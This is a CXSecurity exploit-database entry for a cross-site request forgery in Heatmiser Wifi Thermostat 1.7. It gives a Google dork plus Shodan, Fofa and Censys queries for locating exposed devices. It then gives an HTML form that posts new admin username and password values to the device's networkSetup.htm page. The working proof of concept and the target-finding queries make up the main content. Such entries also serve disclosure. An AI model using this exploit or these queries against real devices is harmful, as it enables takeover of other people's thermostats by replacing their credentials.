---
title: Heatmiser Wifi Thermostat 1.7 - Cross-Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2024110030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-18
fetch_date: 2025-10-06T19:12:11.963826
---

# Heatmiser Wifi Thermostat 1.7 - Cross-Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Heatmiser Wifi Thermostat 1.7 - Cross-Site Request Forgery** **2024.11.17**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Low**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** intitle:"Heatmiser Wifi Thermostat"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Heatmiser Wifi Thermostat 1.7 - Cross-Site Request Forgery ( CSRF )
# Dork: intitle:"Heatmiser Wifi Thermostat"
# Shodan : http.html\_hash:-1473355578
# Fofa : "Heatmiser Wifi Thermostat"
# Censys : "Heatmiser Wifi Thermostat"
# Exploit Author: parsa rezaie khiabanloo
# Vendor Lnk: https://www.heatmiser.com/en/
# Product Link: https://www.heatmiser.com/en/wireless-thermostats/
# Tested on: Heatmiser Version 1.7
# Exploit :
<form method="post" name="config" action="http://IP/networkSetup.htm">
Name:<input type="text" name="usnm" maxlength="16" value="s" onchange="textchange()">
Password:<input type="password" maxlength="16" style="width:150px;" name="usps" >
Confirm User Password:<input type="password" maxlength="16" style="width:150px;" name="cfps" onchange="textchange()">
<input id="btnSubmit" type="submit" class="sm" value=" Save " onclick="saveclick()">
</form>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top